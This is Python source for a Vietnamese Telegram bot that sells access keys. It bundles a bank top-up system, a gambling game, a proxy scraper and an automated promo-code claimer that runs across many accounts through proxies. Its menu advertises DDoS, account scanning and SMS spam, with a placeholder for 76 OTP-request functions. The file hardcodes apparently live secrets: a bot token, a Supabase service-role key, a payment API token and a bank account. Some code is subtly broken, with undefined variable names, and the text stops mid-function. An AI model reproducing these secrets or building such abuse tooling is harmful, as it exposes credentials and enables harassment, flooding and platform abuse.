#!/usr/bin/env python3
"""
Bot Tổng Hợp Full - IZE (1 VND = 1 IZE), Shop, Nạp IZE MB Bank, Chat Relay, Key Master, Proxy, Supabase
"""
import os, asyncio, tempfile, logging, threading, concurrent.futures, time, re, json, random, string, secrets
from datetime import date, timedelta, datetime
from urllib.parse import urlparse
from queue import Queue

import requests
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)
from telegram.error import BadRequest

from supabase import create_client, Client
from dotenv import load_dotenv
load_dotenv()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8504373990:AAFrTK10Is1KlArldSbuZB9sI8Q-UvsLkZU"
DATA_FILE = "bot_user_data.json"
OWNER_USER_ID = int(os.environ.get("OWNER_ID", "0"))
ADMIN_USERNAME = "izedentiroty01"

SUPABASE_URL = "https://ugauoadvktfmzquwcxdd.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVnYXVvYWR2a3RmbXpxdXdjeGRkIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODUwMjQ5MSwiZXhwIjoyMDk0MDc4NDkxfQ.lNgCkjFU2lE6880RqlGBYDgz8bm3GDdkTIot0IzGvI0"
supabase: Client = None

# ==================== SEPAY CONFIG ====================
SEPA_API_TOKEN = "33UKQBQ0JLPZTRMODCGDYLFQBO6NA95ISYZVXDXEJL6WRC8QKHDTFWYSMPRVEW2L"
SEPAY_ACCOUNT_NUMBER = "05237890382763"  # THAY BẰNG STK MB BANK THẬT
SEPAY_BIN = "970422"
NAP_RATE = 1

nap_requests = {}

def init_supabase():
    global supabase
    if SUPABASE_URL and SUPABASE_KEY:
        try: supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
        except: supabase = None

user_data_store = {}
user_runtime = {}
chat_state = {"active": False, "users": set(), "messages": {}, "anon_users": set()}
shop_items = []

# Global tasks
stress_tasks = {}
scan_lq_tasks = {}
spam_tasks = {}
all_otp_funcs = []  # Thay bằng 76 hàm OTP từ file 3.py

def load_all_data():
    global supabase, user_data_store, shop_items
    if supabase is None:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f: user_data_store = json.load(f)
        else: user_data_store = {"blacklist": [], "owner": OWNER_USER_ID, "bot_enabled": True, "keys": {}}
    else:
        user_data_store = {"blacklist": [], "owner": OWNER_USER_ID, "bot_enabled": True, "keys": {}, "top_reset_date": "2000-01-01"}
        try:
            res = supabase.table("user_data").select("*").execute()
            for row in res.data:
                uid = row['user_id']; data = row.get('data', {})
                if uid == 0:
                    for k in ("blacklist","keys","top_reset_date","bot_enabled","owner"): user_data_store[k] = data.get(k, user_data_store.get(k))
                    user_data_store["shop_items"] = data.get("shop_items", [])
                else: user_data_store[str(uid)] = data
        except Exception as e:
            logger.error(f"Lỗi load Supabase: {e}")
            supabase = None
    for k, v in {"bot_enabled": True, "keys": {}, "top_reset_date": "2000-01-01", "shop_items": []}.items():
        if k not in user_data_store: user_data_store[k] = v
    shop_items = user_data_store["shop_items"]

def save_all_data():
    global supabase, user_data_store, shop_items
    user_data_store["shop_items"] = shop_items
    if supabase is None:
        with open(DATA_FILE, 'w', encoding='utf-8') as f: json.dump(user_data_store, f, indent=2)
        return
    for uid_str, data in user_data_store.items():
        if uid_str in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
        try: supabase.table("user_data").upsert({"user_id": int(uid_str), "data": data, "updated_at": datetime.utcnow().isoformat()}).execute()
        except Exception as e: logger.error(f"Lỗi save user {uid_str}: {e}")
    save_global_config()

def save_global_config():
    if supabase is None: return
    config = {k: user_data_store.get(k) for k in ("blacklist","keys","top_reset_date","bot_enabled","owner","shop_items")}
    try: supabase.table("user_data").upsert({"user_id": 0, "data": config, "updated_at": datetime.utcnow().isoformat()}).execute()
    except Exception as e: logger.error(f"Lỗi save global: {e}")

def is_bot_enabled(): return user_data_store.get("bot_enabled", True)

# ==================== ANTISPAM ====================
def check_antispam(uid):
    if is_owner(uid): return True, ""
    if is_blacklisted(uid): return False, "⛔ Bạn đã bị ban vĩnh viễn. Liên hệ admin để gỡ."
    a = get_user_antispam(uid); now = time.time()
    if a["ban_until"] > now: return False, "⚠️ Bạn đã bị cấm 4 giờ vì spam."
    timestamps = [t for t in a["timestamps"] if now - t < 4.0]
    a["timestamps"] = timestamps; timestamps.append(now)
    if len(timestamps) >= 3:
        a["ban_until"] = now + 4*3600; a["timestamps"] = []; save_all_data()
        return False, "⚠️ Bạn đã bị cấm 4 giờ vì spam."
    save_all_data(); return True, ""

def update_user_profile(user_id, update):
    uid = str(user_id)
    if uid not in user_data_store: user_data_store[uid] = {}
    user = update.effective_user
    user_data_store[uid]["profile"] = {"username": user.username, "first_name": user.first_name, "last_name": user.last_name}
    if "game" not in user_data_store[uid]:
        user_data_store[uid]["game"] = {"balance": 0, "ize_balance": 0, "bet_amount": 0, "bet_currency": "VND", "received_welcome_bonus": False, "last_daily": None}
    if "activated_key" not in user_data_store[uid]: user_data_store[uid]["activated_key"] = None
    if "nap_code" not in user_data_store[uid]: user_data_store[uid]["nap_code"] = f"NAP{uid}"
    save_all_data()

def get_user_game_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "game" not in user_data_store[u]:
        user_data_store[u]["game"] = {"balance": 0, "ize_balance": 0, "bet_amount": 0, "bet_currency": "VND", "received_welcome_bonus": False, "last_daily": None}
    return user_data_store[u]["game"]

def get_user_xworld_data(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "xworld" not in user_data_store[u]:
        user_data_store[u]["xworld"] = {"accounts":[],"codes":[],"threshold":5,"claimed_history":{},"limit_reached":[]}
    return user_data_store[u]["xworld"]

def get_user_antispam(uid):
    u = str(uid)
    if u not in user_data_store: user_data_store[u] = {}
    if "antispam" not in user_data_store[u]: user_data_store[u]["antispam"] = {"timestamps":[],"ban_until":0.0}
    return user_data_store[u]["antispam"]

def get_user_runtime(uid):
    if uid not in user_runtime: user_runtime[uid] = {"proxy_task":None,"proxy_msg":None,"proxy_stop_event":None,"monitor_task":None,"monitoring":False}
    return user_runtime[uid]

def is_blacklisted(uid): return str(uid) in user_data_store.get("blacklist",[])
def is_owner(uid): return uid == user_data_store.get("owner",0) and uid != 0
def is_admin(uid):
    if is_owner(uid): return True
    return user_data_store.get(str(uid), {}).get('is_master', False)

def format_money(amount): return f"{amount:,} VND"
def format_ize(amount): return f"{amount} IZ"
def parse_money(text): return int(text.replace(",","").strip())

def grant_welcome_bonus(uid):
    g = get_user_game_data(uid)
    if not g["received_welcome_bonus"]:
        g["balance"] += 10_000_000; g["received_welcome_bonus"] = True; save_all_data()
        return True
    return False

def grant_daily_bonus(uid):
    g = get_user_game_data(uid)
    today = date.today().isoformat()
    if g.get("last_daily") != today:
        g["balance"] += 500_000; g["last_daily"] = today; save_all_data()
        return True
    return False

# ==================== KEY SYSTEM ====================
def generate_key():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))

def create_key(owner_id, duration_str=None, is_master=False):
    key = generate_key()
    now = datetime.utcnow()
    duration_seconds = None
    if duration_str:
        duration_str = duration_str.lower()
        match = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration_str)
        if match:
            num = int(match.group(1)); unit = match.group(2)
            if unit == "s": duration_seconds = num
            elif unit == "m": duration_seconds = num * 60
            elif unit == "h": duration_seconds = num * 3600
            elif unit == "d": duration_seconds = num * 86400
            elif unit == "w": duration_seconds = num * 604800
            elif unit == "month": duration_seconds = num * 2592000
            elif unit == "year": duration_seconds = num * 31536000
    user_data_store["keys"][key] = {
        "created_by": owner_id, "created_at": now.isoformat(),
        "duration_seconds": duration_seconds, "expires_at": None,
        "assigned_to": None, "is_master": is_master
    }
    save_global_config()
    save_all_data()
    return key

def check_user_key(user_id):
    uid = str(user_id)
    user_data = user_data_store.get(uid, {})
    key = user_data.get("activated_key")
    if not key or key not in user_data_store.get("keys", {}): return False
    key_info = user_data_store["keys"][key]
    if key_info.get("assigned_to") != user_id: return False
    if key_info.get("expires_at"):
        expires = datetime.fromisoformat(key_info["expires_at"])
        if datetime.utcnow() > expires:
            if key_info.get("is_master"):
                user_data_store[uid].pop("is_master", None)
            del user_data_store["keys"][key]
            user_data_store[uid]["activated_key"] = None
            save_global_config()
            save_all_data()
            return False
    return True

async def request_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🔑 Bạn chưa có key sử dụng bot.\nVui lòng nhập key (liên hệ @{ADMIN_USERNAME} để được cấp).\n🛒 /shop - Vào cửa hàng"
    )
    context.user_data["expect_key"] = True

async def process_key_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id; key = update.message.text.strip()
    keys = user_data_store.get("keys", {})
    if key not in keys: await update.message.reply_text("❌ Key không hợp lệ."); return
    key_info = keys[key]
    if key_info.get("assigned_to") is not None and key_info["assigned_to"] != uid:
        await update.message.reply_text("❌ Key này đã được sử dụng bởi người khác."); return
    if key_info.get("expires_at"):
        expires = datetime.fromisoformat(key_info["expires_at"])
        if datetime.utcnow() > expires: await update.message.reply_text("❌ Key này đã hết hạn."); return
    else:
        if key_info.get("duration_seconds") is not None:
            key_info["expires_at"] = (datetime.utcnow() + timedelta(seconds=key_info["duration_seconds"])).isoformat()
    key_info["assigned_to"] = uid
    user_data_store[str(uid)]["activated_key"] = key
    context.user_data.pop("expect_key", None)
    if key_info.get("is_master"):
        user_data_store[str(uid)]["is_master"] = True
        save_global_config()
        save_all_data()
        await update.message.reply_text("👑 Key Master! Bạn có toàn quyền admin. Gõ /menu để bắt đầu.")
    else:
        save_global_config()
        save_all_data()
        await update.message.reply_text("✅ Key hợp lệ! Bạn có thể sử dụng bot ngay bây giờ. Gõ /menu để bắt đầu.")

# ==================== USER PROXY ====================
def get_user_proxy_string(user_id):
    return user_data_store.get(str(user_id), {}).get("proxy", None)

def set_user_proxy(user_id, proxy_str):
    uid = str(user_id)
    if uid not in user_data_store: user_data_store[uid] = {}
    user_data_store[uid]["proxy"] = proxy_str
    save_all_data()

def get_proxy_dict(user_id):
    proxy_str = get_user_proxy_string(user_id)
    if proxy_str:
        if proxy_str.startswith(("socks5://","http://","https://")):
            return {"http": proxy_str, "https": proxy_str}
        else:
            return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
    return None

# ==================== PROXY (HTTP) ====================
def fetch_proxies_from_url_http(url, table_id=None, table_class=None, proxies=None):
    headers = {"User-Agent":"Mozilla/5.0"}
    proxies_list = []
    try:
        r = requests.get(url, headers=headers, timeout=15, proxies=proxies); r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        table = soup.find("table", id=table_id) if table_id else (soup.find("table", class_=table_class) if table_class else soup.find("table"))
        if not table: return proxies_list
        tbody = table.find("tbody")
        rows = tbody.find_all("tr") if tbody else table.find_all("tr")
        for row in rows:
            cols = row.find_all("td")
            if len(cols) >= 2:
                ip = cols[0].text.strip(); port = cols[1].text.strip()
                if ip and port: proxies_list.append(f"http://{ip}:{port}")
    except Exception as e: logger.error(f"Crawl {url}: {e}")
    return proxies_list

def fetch_proxies_from_github_raw_http(url, proxies=None):
    proxies_list = []
    try:
        resp = requests.get(url, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            for item in re.split(r"\s+", resp.text.strip()):
                if not item or ":" not in item: continue
                if item.startswith(("https://","socks4://","socks5://")): continue
                proxies_list.append(item if item.startswith("http://") else f"http://{item}")
    except: pass
    return proxies_list

def fetch_proxies_from_text_url_http(url, proxies=None):
    proxies_list = []
    try:
        resp = requests.get(url, timeout=15, proxies=proxies)
        if resp.status_code == 200:
            for line in resp.text.splitlines():
                line = line.strip()
                if not line or ":" not in line: continue
                if line.startswith(("https://","socks4://","socks5://")): continue
                proxies_list.append(line if line.startswith("http://") else f"http://{line}")
    except: pass
    return proxies_list

def fetch_all_proxies_http(proxies=None):
    sources = [
        ("https://free-proxy-list.net/","proxylisttable",None),
        ("https://www.sslproxies.org/",None,"table"),
        ("https://us-proxy.org/","proxylisttable",None),
        ("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",None,None),
        ("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",None,None),
        ("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",None,None),
        ("https://raw.githubusercontent.com/Proxy-Hub/proxy-list/main/http.txt",None,None),
        ("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",None,None),
        ("https://www.proxy-list.download/api/v1/get?type=http",None,None),
    ]
    allp = []
    for url, tid, tcl in sources:
        if tid or tcl: lst = fetch_proxies_from_url_http(url, tid, tcl, proxies)
        elif "raw.githubusercontent.com" in url or "proxy-list.download" in url or "proxyscrape" in url:
            lst = fetch_proxies_from_github_raw_http(url, proxies)
        else: lst = fetch_proxies_from_text_url_http(url, proxies)
        allp.extend(lst); time.sleep(0.5)
    unique, seen = [], set()
    for p in allp:
        if p not in seen: seen.add(p); unique.append(p)
    return unique

def check_proxy_http(proxy, test_url, timeout=15):
    try:
        s = time.time()
        r = requests.get(test_url, proxies={"http":proxy,"https":proxy}, timeout=timeout)
        if r.status_code == 200: return True, round(time.time()-s,3), proxy
    except: pass
    return False, None, proxy

def check_proxies_batch_http(proxies_list, test_url, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    if not proxies_list: return []
    live = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exec:
        fut = {exec.submit(check_proxy_http, p, test_url, timeout): p for p in proxies_list}
        for f in concurrent.futures.as_completed(fut):
            if stop_event and stop_event.is_set(): break
            try:
                ok, rt, _ = f.result()
                if ok: live.append((fut[f], rt))
            except: pass
    return live

def check_proxies_from_file_http(path, test_url, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    try:
        with open(path, encoding="utf-8") as f: raw = [line.strip() for line in f if line.strip()]
    except: return []
    if not raw: return []
    clean = [f"http://{p}" if not p.startswith("http://") else p for p in raw]
    return check_proxies_batch_http(clean, test_url, timeout, max_workers, stop_event, user_proxies)

def multi_round_check_http(initial, test_url, rounds=3, interval_min=5, timeout=15, max_workers=200, stop_event=None, user_proxies=None):
    live = check_proxies_batch_http(initial, test_url, timeout, max_workers, stop_event, user_proxies)
    if stop_event and stop_event.is_set(): return []
    current = [p for p,_ in live]
    if not current: return []
    for r in range(2, rounds+1):
        if stop_event and stop_event.is_set(): return []
        for _ in range(interval_min*60):
            if stop_event and stop_event.is_set(): return []
            time.sleep(1)
        live = check_proxies_batch_http(current, test_url, timeout, max_workers, stop_event, user_proxies)
        if stop_event and stop_event.is_set(): return []
        current = [p for p,_ in live]
    return live

def format_proxy_list_short(lst):
    if not lst: return "Không có proxy nào."
    lines = [f"✅ Tổng proxy live: {len(lst)}"]
    for i,(p,t) in enumerate(lst):
        if i >= 50: lines.append(f"... và {len(lst)-50} proxy khác."); break
        lines.append(f"{p}  ({t}s)")
    return "\n".join(lines)

def create_result_file(lst):
    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".txt", encoding="utf-8") as f:
        f.write(f"Proxy list ({len(lst)} live)\n")
        for p,t in lst: f.write(f"{p}  ({t}s)\n")
        return f.name

# ==================== XWORLD ====================
def get_code_info(code, proxies=None):
    headers = {'accept':'*/*','accept-language':'vi,en;q=0.9','content-type':'application/json','country-code':'vn',
               'origin':'https://xworld-app.com','referer':'https://xworld-app.com/','user-agent':'Mozilla/5.0','xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/detail', headers=headers,
                          json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5, proxies=proxies).json()
        if r.get('code')==0 and r.get('message')=='ok':
            d = r['data']; ad = d['data']['admin']
            return {'status':True,'total':d['user_cnt'],'used':d['progress'],'remaining':d['user_cnt']-d['progress'],
                    'currency':d.get('currency','UNK'),'value':ad.get('ad_show_value',0),'name':ad.get('nick_name','Admin')}
    except: pass
    return {'status':False,'message':'Lỗi'}

def nhap_code(userId, secretKey, code, proxies=None):
    headers = {'accept':'*/*','content-type':'application/json','origin':'https://xworld.info','referer':'https://xworld.info/',
               'user-agent':'Mozilla/5.0','user-id':userId,'user-secret-key':secretKey,'xb-language':'vi-VN'}
    try:
        r = requests.post('https://web3task.3games.io/v1/task/redcode/exchange', headers=headers,
                          json={'code':code,'os_ver':'android','platform':'h5','appname':'app'}, timeout=5, proxies=proxies).json()
        if r.get('code')==0 and r.get('message')=='ok':
            val = r['data'].get('value',0); cur = r['data'].get('currency','')
            return True, f"SUCCESS|{userId}|{val}|{cur}"
        else:
            msg = r.get('message','').lower()
            if "limit" in msg: return False, "LIMIT_REACHED"
            if "reward has been received" in msg: return False, "CLAIMED"
            if "not exist" in msg or "finish" in msg: return False, "EXHAUSTED"
            return False, r.get('message','Unknown')
    except Exception as e: return False, str(e)

def parse_account_link(link):
    try:
        uid = link.split('?userId=')[1].split('&')[0]
        key = link.split('secretKey=')[1].split('&')[0]
        return uid, key
    except: return None, None

# ==================== GAME TÀI XỈU ====================
def game_menu_keyboard(uid):
    g = get_user_game_data(uid)
    cur = g.get("bet_currency", "VND")
    txt = f"🎲 *Tài Xỉu*\n💰 VND: {format_money(g['balance'])}\n💠 IZE: {format_ize(g['ize_balance'])}\n🎫 Cược: {format_money(g['bet_amount']) if cur=='VND' else format_ize(g['bet_amount'])} ({cur})"
    kb = [
        [InlineKeyboardButton("💵 Đặt cược", callback_data="game_setbet")],
        [InlineKeyboardButton("💱 Đổi tiền cược", callback_data="game_currency")],
        [InlineKeyboardButton("📈 Tài", callback_data="game_tai"), InlineKeyboardButton("📉 Xỉu", callback_data="game_xiu")]
    ]
    return InlineKeyboardMarkup(kb), txt

# ==================== KEYBOARDS ====================
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🌐 Scan Proxy", callback_data="menu_proxy")],
        [InlineKeyboardButton("🎯 Canh Code XWorld", callback_data="menu_xworld")],
        [InlineKeyboardButton("🎲 Trò chơi Tài Xỉu", callback_data="game_menu")],
        [InlineKeyboardButton("💣 DDOS Test", callback_data="menu_ddos")],
        [InlineKeyboardButton("🎮 Scan Acc LQ", callback_data="menu_scanlq")],
        [InlineKeyboardButton("📧 Spam SMS", callback_data="menu_spam")]
    ])

def proxy_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📁 Check từ file", callback_data="proxy_check_file")],
        [InlineKeyboardButton("⚡ Check auto nhanh", callback_data="proxy_check_auto")],
        [InlineKeyboardButton("🕒 Check sống lâu", callback_data="proxy_check_long")],
        [InlineKeyboardButton("▶️ Bắt đầu quét", callback_data="proxy_start_scan")],
        [InlineKeyboardButton("🛑 Dừng quét", callback_data="proxy_stop_scan")]
    ])

def xworld_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Cài đặt", callback_data="xw_settings")],
        [InlineKeyboardButton("➕ Thêm Code", callback_data="xw_add_code")],
        [InlineKeyboardButton("▶️ Bắt đầu canh", callback_data="xw_start_monitor")],
        [InlineKeyboardButton("⏹️ Dừng canh", callback_data="xw_stop_monitor")]
    ])

def xw_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Thêm tài khoản", callback_data="xw_add_account")],
        [InlineKeyboardButton("📋 Xem tài khoản", callback_data="xw_view_accounts")],
        [InlineKeyboardButton("🎚️ Đặt ngưỡng", callback_data="xw_set_threshold")],
        [InlineKeyboardButton("🔙 Quay lại", callback_data="menu_xworld")]
    ])

# ==================== NẠP IZE (ĐÃ FIX TOÀN BỘ) ====================
def generate_vietqr(so_tai_khoan, ten_chu_tk, ma_bin, so_tien, noi_dung):
    amount_str = str(so_tien)
    noi_dung = noi_dung[:25]
    return f"https://vietqr.co/api/generate/{ma_bin}/{so_tai_khoan}/{ten_chu_tk}/{amount_str}/{noi_dung}?style=1&logo=1&isMask=1"

async def cmd_nap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args:
        await update.message.reply_text("📝 Dùng: /nap <số VND> (tối thiểu 1,000)\nTỷ giá: 1 VND = 1 IZE"); return
    try: amount = parse_money(context.args[0])
    except: await update.message.reply_text("❌ Số tiền không hợp lệ."); return
    if amount < 1000: await update.message.reply_text("❌ Tối thiểu 1,000 VND."); return
    user_data = user_data_store.setdefault(str(uid), {})
    nap_code = user_data.get("nap_code", f"NAP{uid}")
    user_data["nap_code"] = nap_code
    save_all_data()
    nap_requests[uid] = {"amount": amount, "content": nap_code, "time": time.time(), "checked": False}
    qr_url = generate_vietqr(SEPAY_ACCOUNT_NUMBER, "IZE BOT", SEPA_BIN, amount, nap_code)
    msg = (
        f"🏦 *Nạp IZE qua MB Bank*\n"
        f"💰 Số tiền: {format_money(amount)}\n"
        f"💠 Sẽ nhận: {format_ize(amount // NAP_RATE)}\n"
        f"📝 Mã nạp của bạn: `{nap_code}`\n"
        f"⚠️ *Chuyển đúng nội dung và số tiền*\n"
        f"[📱 Quét QR để chuyển khoản]({qr_url})"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def cmd_mynapcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    user_data = user_data_store.get(str(uid), {})
    nap_code = user_data.get("nap_code", f"NAP{uid}")
    if "nap_code" not in user_data: user_data["nap_code"] = nap_code; save_all_data()
    await update.message.reply_text(f"📝 Mã nạp của bạn: `{nap_code}`\nHãy nhập đúng mã này khi chuyển khoản.", parse_mode="Markdown")

async def check_nap_transactions(context: ContextTypes.DEFAULT_TYPE):
    if not SEPA_API_TOKEN: return
    headers = {"Authorization": f"Bearer {SEPA_API_TOKEN}", "Content-Type": "application/json"}
    try:
        r = requests.get("https://my.sepay.vn/userapi/transactions/list", headers=headers,
                         params={"account_number": SEPA_ACCOUNT_NUMBER, "limit": 20}, timeout=10)
        if r.status_code != 200: return
        data = r.json()
        transactions = data.get("transactions", [])
        for txn in transactions:
            amount_in = float(txn.get("amount_in", 0))
            if amount_in <= 0: continue
            txn_content = txn.get("transaction_content", "")
            for uid, nap in list(nap_requests.items()):
                if nap["checked"]: continue
                if nap["content"] in txn_content and amount_in == float(nap["amount"]):
                    ize_amount = int(amount_in) // NAP_RATE
                    if ize_amount > 0:
                        game = get_user_game_data(uid)
                        game["ize_balance"] += ize_amount
                        save_all_data()
                        try: await context.bot.send_message(uid, f"✅ Đã nhận {format_money(int(amount_in))} VND\n💠 Đã cộng {format_ize(ize_amount)} vào tài khoản!")
                        except: pass
                    nap["checked"] = True
                    if uid in nap_requests: del nap_requests[uid]
    except Exception as e: logger.error(f"Lỗi check SePay: {e}")

# ==================== UPLOAD SUPABASE ====================
def upload_to_supabase(local_path, remote_name):
    if supabase is None: return None
    try:
        with open(local_path, 'rb') as f:
            supabase.storage.from_("bot-files").upload(f"output/{remote_name}", f.read(), {"upsert": True})
        return supabase.storage.from_("bot-files").get_public_url(f"output/{remote_name}")
    except Exception as e: logger.error(f"Upload lỗi: {e}"); return None
# ==================== PROXY HANDLERS ====================
async def proxy_update_progress(update, uid, text):
    rt = get_user_runtime(uid); msg = rt.get("proxy_msg")
    if msg:
        try: await msg.edit_text(text, parse_mode="Markdown")
        except: pass

async def proxy_stop_scan(update, uid):
    rt = get_user_runtime(uid)
    if rt.get("proxy_stop_event"): rt["proxy_stop_event"].set()
    if rt.get("proxy_task") and not rt["proxy_task"].done(): rt["proxy_task"].cancel()
    rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None

async def run_proxy_check(update, context, long_mode=False):
    uid = update.effective_user.id; rt = get_user_runtime(uid)
    if rt.get("proxy_task") and not rt["proxy_task"].done():
        await update.callback_query.edit_message_text("⚠️ Scan proxy đang chạy."); return
    msg = await update.callback_query.message.reply_text("🔄 Đang khởi tạo...")
    rt["proxy_msg"] = msg; ev = threading.Event(); rt["proxy_stop_event"] = ev
    user_proxies = get_proxy_dict(uid)
    loop = asyncio.get_running_loop()
    def block():
        try:
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"🌐 Đang crawl..."), loop)
            proxies = fetch_all_proxies_http(user_proxies)
            if ev.is_set(): return None
            if not proxies:
                asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,"❌ Không lấy được proxy."), loop)
                return None
            asyncio.run_coroutine_threadsafe(proxy_update_progress(update,uid,f"📊 Đã lấy {len(proxies)} proxy. Đang kiểm tra..."), loop)
            if long_mode:
                return multi_round_check_http(proxies, "http://ip-api.com/json/", 3, 5, 15, 200, ev, user_proxies)
            else:
                return check_proxies_batch_http(proxies, "http://ip-api.com/json/", 15, 200, ev, user_proxies)
        except Exception as e: logger.error(f"blocking: {e}"); return None
    task = asyncio.create_task(loop.run_in_executor(None, block))
    rt["proxy_task"] = task
    try: live = await task
    except asyncio.CancelledError: await proxy_update_progress(update,uid,"⏹️ Đã hủy."); return
    except Exception as e: logger.error(f"proxy error: {e}"); await msg.edit_text("❌ Lỗi."); return
    finally: rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None
    if ev.is_set(): return
    if not live: await msg.edit_text("❌ Không có proxy live."); return
    if len(live) <= 50: await msg.edit_text(format_proxy_list_short(live), parse_mode="Markdown")
    else:
        path = create_result_file(live)
        public_url = upload_to_supabase(path, "proxy_live.txt")
        if public_url: await msg.reply_text(f"📥 Tải file: {public_url}")
        else: await msg.reply_document(open(path,"rb"), filename="proxy_live.txt")
        await msg.edit_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(path)

async def handle_proxy_file_upload(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    ok, antispam_msg = check_antispam(uid)
    if not ok: await update.message.reply_text(antispam_msg); return
    if not context.user_data.get("waiting_proxy_file"):
        await update.message.reply_text("Hãy dùng menu Proxy -> Check từ file."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"): await update.message.reply_text("⚠️ Chỉ chấp nhận .txt"); return
    context.user_data["waiting_proxy_file"] = False
    await update.message.reply_text("⏳ Đang kiểm tra...")
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
    await (await doc.get_file()).download_to_drive(tmp.name)
    path = tmp.name; ev = threading.Event()
    user_proxies = get_proxy_dict(uid)
    loop = asyncio.get_running_loop()
    try: live = await loop.run_in_executor(None, lambda: check_proxies_from_file_http(path, "http://ip-api.com/json/", 15, 200, ev, user_proxies))
    except Exception as e: await update.message.reply_text(f"❌ Lỗi: {e}"); return
    finally: os.unlink(path)
    if not live: await update.message.reply_text("❌ Không có proxy live."); return
    if len(live) <= 50: await update.message.reply_text(format_proxy_list_short(live))
    else:
        p = create_result_file(live)
        public_url = upload_to_supabase(p, "proxy_live.txt")
        if public_url: await update.message.reply_text(f"📥 Tải file: {public_url}")
        else: await update.message.reply_document(open(p,"rb"), filename="proxy_live.txt")
        await update.message.reply_text(f"✅ Hoàn tất! {len(live)} proxy live.", parse_mode="Markdown")
        os.unlink(p)

# ==================== XWORLD HANDLERS ====================
async def xworld_send_msg(chat_id, text, context):
    try: await context.bot.send_message(chat_id, text, parse_mode='Markdown', disable_web_page_preview=True)
    except: pass

async def xworld_monitor_loop(user_id, chat_id, context):
    rt = get_user_runtime(user_id); data = get_user_xworld_data(user_id)
    codes = data["codes"]; accounts = data["accounts"]; threshold = data["threshold"]
    claimed = data["claimed_history"]; limit = data["limit_reached"]
    rt["monitoring"] = True
    user_proxies = get_proxy_dict(user_id)
    await xworld_send_msg(chat_id, "🔍 Bắt đầu quét API...", context)
    while rt["monitoring"]:
        for item in codes[:]:
            code = item["code"]; info = get_code_info(code, user_proxies)
            if not info["status"]: await xworld_send_msg(chat_id, f"⚠️ Code `{code}` lỗi.", context); continue
            remaining = info["remaining"]; item["info"] = info; save_all_data()
            if remaining <= 0: codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` hết.", context); save_all_data(); continue
            if 0 < remaining <= threshold:
                await xworld_send_msg(chat_id, f"⚡️ Code `{code}` còn {remaining}/{info['total']} lượt. TẤN CÔNG!", context)
                loop = asyncio.get_running_loop()
                for acc in accounts:
                    if acc["user_id"] in limit or code in claimed.get(acc["user_id"], []): continue
                    if not rt["monitoring"]: break
                    success, msg = await loop.run_in_executor(None, nhap_code, acc["user_id"], acc["secret_key"], code, user_proxies)
                    uid = acc["user_id"]
                    if success:
                        _, u, v, c = msg.split('|')
                        await xworld_send_msg(chat_id, f"✅ `{uid}` nhận {v} {c}", context)
                        claimed.setdefault(uid,[]).append(code)
                    else:
                        if msg == "LIMIT_REACHED":
                            if uid not in limit: limit.append(uid)
                        elif msg == "EXHAUSTED": break
                info2 = get_code_info(code, user_proxies)
                if info2["status"] and info2["remaining"] <= 0:
                    codes.remove(item); await xworld_send_msg(chat_id, f"🏁 Code `{code}` cạn.", context)
                save_all_data()
        await asyncio.sleep(1.5)
    await xworld_send_msg(chat_id, "⏹️ Dừng canh.", context)

async def start_xworld_monitor(update, context):
    uid = update.effective_user.id; data = get_user_xworld_data(uid); rt = get_user_runtime(uid)
